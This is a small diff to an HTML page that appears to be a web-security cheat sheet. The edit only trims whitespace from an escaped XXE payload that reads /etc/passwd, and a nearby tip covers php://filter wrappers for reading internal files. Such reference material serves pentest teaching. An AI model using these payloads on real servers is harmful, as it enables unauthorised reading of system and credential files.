@@ -1076,7 +1076,7 @@ layout: default
 		<li>Use php wrappers to access internal files <code>php://filter/convert.base64-encode/resource=</code></li>
 	</ul>
 
-	<pre>&#9;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#13;&#10;&#9;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&#13;&#10;&lt;container&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/container&gt;</pre>
+	<pre>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#13;&#10;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&#13;&#10;&lt;container&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/container&gt;</pre>
 	
 	<li>SSRF</li>
 
